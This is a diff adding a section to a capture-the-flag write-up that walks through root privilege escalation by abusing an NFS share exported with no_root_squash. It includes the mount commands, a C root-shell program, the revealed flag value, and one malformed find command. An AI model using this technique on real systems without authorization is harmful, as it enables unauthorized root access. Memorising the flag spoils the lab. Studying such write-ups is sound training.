@@ -248,3 +248,37 @@ cat $loc
 
 ### What is the content of the flag7.txt file?
 
+- Mount one of the shares listed in the target's NFS configuration file
+    - Can use `showmount -e <target ip>` to list available shares
+    - Make a temporary directory on attack machine to mount to
+        - `mkdir /tmp/sharedfolder`
+    - `mount -o rw <target ip>:/home/ubuntu/sharedfolder /tmp/sharedfolder` to mount network file share to attack machine
+        - In this case, "/home/ubuntu/sharedfolder" is one of the directories with *no_root_squash* on the target system
+    - `cd /tmp/sharedfolder` to change to the mounted file share
+- Create a script that can run as root in the temporary directory on attack machine
+    - `vim nfs.c` to create a new C file and begin editing (can replace `vim` with your text editor of choice)
+
+#### Example C Script:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+        return 0;
+}
+```
+
+- `gcc nfs.c -o nfs -w` to compile the C script to a file called "nfs"
+- This script will also be on the target machine, since "sharedfolder" is mounted from the target machine
+- `./nfs` to escalate to root
+- `find / -n "flag7.txt"` to search recursively from root directory for flag7 file
+
+> <details><summary><code>cat /home/matt/flag7.txt</code> to get the flag </summary>THM-89384012</details>
+
+## Capstone Challenge
+
